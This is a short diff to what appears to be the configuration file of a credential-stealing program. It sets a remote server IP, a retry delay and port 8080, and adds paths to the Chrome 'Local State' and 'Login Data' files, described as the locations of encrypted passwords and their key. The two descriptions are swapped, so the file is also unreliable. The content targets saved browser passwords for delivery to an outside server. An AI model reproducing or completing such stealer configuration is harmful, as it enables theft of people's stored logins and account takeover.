@@ -1,3 +1,5 @@
 219.217.65.18 <= server ip
 120	  <= delay to try again to send request if one before fails
 8080  <= port
+AppData/Local/Google/Chrome/User Data/Local State                  <= put here path to file containing encrypted passwords
+AppData/Local/Google/Chrome/User Data/Default/Login Data           <= put here path to file containing encryption key
